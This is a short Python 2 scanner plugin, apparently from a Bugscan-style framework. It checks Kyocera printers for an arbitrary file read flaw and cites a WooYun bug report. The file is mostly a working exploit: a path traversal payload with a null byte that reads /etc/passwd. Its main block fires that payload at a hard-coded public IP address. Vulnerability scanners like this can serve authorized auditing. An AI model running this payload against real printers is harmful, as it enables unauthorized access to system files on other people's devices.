#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: kyocera(京瓷)打印机任意文件读取
refer: http://wooyun.org/bugs/wooyun-2015-0152566
description:
    热乎的
'''

import re
import urlparse


def assign(service, arg):
    if service == 'jingci_printer':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'js/../../../../../../etc/passwd%00.css'
    code, head, res, err, _ = curl.curl2(payload)
    if (code==200) and ('root:' in res):
        security_hole('Arbitrarily file download: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('jingci_printer','http://210.240.69.179/')[1])